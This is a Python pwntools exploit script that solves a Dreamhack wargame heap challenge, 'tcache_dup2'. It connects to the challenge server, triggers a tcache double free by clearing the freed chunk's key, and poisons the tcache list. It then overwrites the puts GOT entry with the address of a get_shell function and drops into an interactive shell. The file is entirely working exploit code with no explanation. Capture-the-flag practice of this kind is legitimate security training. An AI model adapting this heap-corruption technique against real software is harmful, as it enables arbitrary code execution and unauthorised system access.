from pwn import *

p=remote("host1.dreamhack.games",10063)
#p=process("./tcache_dup2")
e=ELF("./tcache_dup2")

def create(size,data):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b": ",str(size).encode())
    p.sendlineafter(b": ",data)

def modify(idx,size,data):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b": ",str(idx).encode())
    p.sendlineafter(b": ",str(size).encode())
    p.sendlineafter(b": ",data)

def delete(idx):
    p.sendlineafter(b"> ",b"3")
    p.sendlineafter(b": ",str(idx).encode())

create(0x10,b'A'*8)
delete(0)
modify(0,0x10,b'A'*8+b'\x00')
delete(0)

modify(0,0x10,p64(e.got["puts"]))
create(0x10,b'B'*8)
create(0x10,p64(e.symbols["get_shell"]))

p.interactive()